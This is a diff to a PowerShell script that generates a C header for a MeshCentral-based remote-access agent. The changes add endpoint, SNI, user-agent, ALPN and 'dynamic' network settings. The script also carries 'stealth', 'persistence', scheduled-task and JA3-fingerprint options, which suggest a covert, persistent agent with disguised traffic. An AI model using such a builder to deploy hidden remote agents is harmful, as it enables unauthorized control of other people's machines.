@@ -176,8 +176,9 @@ $allowlistMacro = Convert-ThumbprintsToMacro -Thumbprints $allowedThumbprints
 $branding = $config.branding
 $network = $config.network
 $fallbackEntries = @()
-if ($network.fallbackEndpoints) {
-    foreach ($entry in $network.fallbackEndpoints) {
+$fallbackSource = Get-OptionalValue -Source $network -PropertyName 'fallbackEndpoints'
+if ($fallbackSource) {
+    foreach ($entry in $fallbackSource) {
         if ($null -eq $entry) { continue }
         if ($entry -is [string]) {
             if ([string]::IsNullOrWhiteSpace($entry)) { continue }
@@ -221,8 +222,30 @@ if ($fallbackCount -gt 0) {
 } else {
     $fallbackListMacro = "{ }"
 }
-$primaryHostHeaderLiteral = Convert-ToCLiteral (Get-OptionalValue -Source $network -PropertyName 'hostHeader')
+$primaryHostHeaderRaw = Get-OptionalValue -Source $network -PropertyName 'hostHeader'
+$primaryHostHeaderLiteral = Convert-ToCLiteral $primaryHostHeaderRaw
 $provisioning = $config.provisioning
+$networkDynamic = Get-OptionalBool -Source $network -PropertyName 'dynamic'
+$primaryEndpointRaw = Get-OptionalValue -Source $network -PropertyName 'primaryEndpoint'
+$primaryEndpointLiteral = Convert-ToCLiteral $primaryEndpointRaw
+$networkSniRaw = Get-OptionalValue -Source $network -PropertyName 'sni'
+$networkSniLiteral = Convert-ToCLiteral $networkSniRaw
+$networkUserAgentRaw = Get-OptionalValue -Source $network -PropertyName 'userAgent'
+$networkUserAgentLiteral = Convert-ToCLiteral $networkUserAgentRaw
+$networkAlpnRaw = Get-OptionalValue -Source $network -PropertyName 'alpn'
+if ($networkAlpnRaw -is [System.Collections.IEnumerable]) {
+    $networkAlpnJoined = @($networkAlpnRaw | Where-Object { -not [string]::IsNullOrWhiteSpace($_) }) -join ';'
+} else {
+    $networkAlpnJoined = $networkAlpnRaw
+}
+$networkAlpnLiteral = Convert-ToCLiteral $networkAlpnJoined
+if ([string]::IsNullOrWhiteSpace($networkAlpnLiteral) -or $networkAlpnLiteral -eq 'NULL') { $networkAlpnLiteral = 'NULL' }
+if ($networkDynamic) {
+    $primaryEndpointLiteral = 'NULL'
+    $networkSniLiteral = 'NULL'
+    $networkAlpnLiteral = 'NULL'
+    if ($fallbackCount -ne 0) { $fallbackCount = 0; $fallbackListMacro = '{ }' }
+}
 $stealth = if ($config.stealth) { $config.stealth } else { [pscustomobject]@{} }
 $persistence = if ($config.persistence) { $config.persistence } else { [pscustomobject]@{} }
 $scheduledTask = if ($persistence.scheduledTask) { $persistence.scheduledTask } else { [pscustomobject]@{} }
@@ -419,13 +442,15 @@ if ($OutputHeader) {
 #define MESH_AGENT_PRODUCT_VERSION_STR TEXT("$productVersionStr")
 
 /* ========== Network Configuration ========== */
-#define MESH_AGENT_NETWORK_ENDPOINT "$($network.primaryEndpoint)"
-#define MESH_AGENT_NETWORK_SNI NULL
+#define MESH_AGENT_NETWORK_ENDPOINT $primaryEndpointLiteral
+#define MESH_AGENT_NETWORK_SNI $networkSniLiteral
 #define MESH_AGENT_NETWORK_HOST_HEADER $primaryHostHeaderLiteral
-#define MESH_AGENT_NETWORK_USER_AGENT "$($network.userAgent)"
+#define MESH_AGENT_NETWORK_USER_AGENT $networkUserAgentLiteral
 #define MESH_AGENT_NETWORK_JA3 NULL
 #define MESH_AGENT_NETWORK_FALLBACK_COUNT $fallbackCount
 #define MESH_AGENT_NETWORK_FALLBACK_LIST $fallbackListMacro
+#undef MESH_ALPN_PROTOCOLS
+#define MESH_ALPN_PROTOCOLS $networkAlpnLiteral
 
 /* ========== Provisioning Data ========== */
 #define MESH_AGENT_MESH_ID "$meshIdHeaderValue"
@@ -532,7 +557,8 @@ if ($serverIdValue) {
     $serverIdPreview = if ($serverIdValue.Length -gt 20) { $serverIdValue.Substring(0,20) + "..." } else { $serverIdValue }
     Write-Host "Server ID: $serverIdPreview" -ForegroundColor Cyan
 }
-Write-Host "Endpoint:  $($network.primaryEndpoint)" -ForegroundColor Cyan
+$endpointPreview = if ($primaryEndpointRaw) { $primaryEndpointRaw } else { "(dynamic from MeshCentral)" }
+Write-Host "Endpoint:  $endpointPreview" -ForegroundColor Cyan
 if ($fallbackCount -gt 0) {
     $idx = 1
     foreach ($entry in $fallbackEntries) {
